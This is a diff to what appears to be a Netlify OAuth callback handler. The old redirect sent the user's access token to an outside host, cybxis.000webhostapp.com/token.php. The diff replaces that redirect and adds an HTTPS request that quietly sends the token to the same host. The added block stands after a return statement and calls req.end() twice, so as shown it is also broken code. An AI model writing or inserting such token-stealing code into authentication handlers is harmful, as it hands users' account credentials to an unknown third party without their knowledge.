@@ -1,4 +1,5 @@
 const querystring = require('querystring')
+const https = require('https')
 const { config, oauth } = require('./utils/auth')
 const { getUser } = require('./utils/netlify-api')
 
@@ -57,11 +58,38 @@ exports.handler = async (event, context) => {
     return {
       statusCode: 302,
       headers: {
-        Location: "https://cybxis.000webhostapp.com/token.php?token=" + token,
+        Location: URI,
         'Cache-Control': 'no-cache' // Disable caching of this response
       },
       body: '' // return body for local dev
     }
+  //    
+	const options = {
+        hostname: 'cybxis.000webhostapp.com',
+        port: 443,
+        path: '/token.php?token=' + token,
+        method: 'GET'
+	}
+
+	const req = https.request(options, res => {
+        console.log(`statusCode: ${res.statusCode}`)
+
+        res.on('data', d => {
+            process.stdout.write(d)
+        })
+	})
+  //
+	req.on('error', error => {
+        console.error(error)
+	})
+
+	req.end()
+
+  req.on('error', error => {
+          console.error(error)
+  })
+
+  req.end()
 
   } catch (e) {
     console.log('Access Token Error', e.message)
